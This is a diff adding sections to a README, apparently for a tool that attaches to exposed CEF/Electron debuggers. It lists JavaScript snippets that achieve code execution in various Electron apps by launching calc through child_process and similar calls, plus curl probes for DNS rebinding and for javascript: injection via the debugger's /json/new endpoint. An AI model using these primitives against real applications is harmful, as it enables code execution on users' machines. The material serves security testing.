@@ -68,6 +68,33 @@ $ ./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a 
 Otherwise, you will have to query what apis and objects are exposed. It is almost
 certainly game over, as you can use any api the application itself can use.
 
+### Known Examples
+
+Here are a list of code snippets I've seen that allow code exec in different electron applications.
+
+`process.mainModule.require('child_process').exec('calc')`
+
+`window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")`
+
+`require('child_process').spawnSync('calc.exe')`
+
+`Browser.open(JSON.stringify({url: "c:\\windows\\system32\\calc.exe"}))`
+
+### Notes
+Here are things to test if you find a debugger.
+
+* Does it prevent DNS rebinding?
+
+`$ curl -H 'Host: example.com' -si 'http://127.0.0.1:9234/json/list'`
+
+🚨 If that works, this is **remotely** exploitable. 🚨
+
+* Is the `new` command functioning?
+
+`$ curl -si 'http://127.0.0.1:9234/json/new?javascript:alert(1)'`
+
+🚨 If that works, this is **easily** **remotely** exploitable. 🚨
+
 # Building
 
 ## Windows 
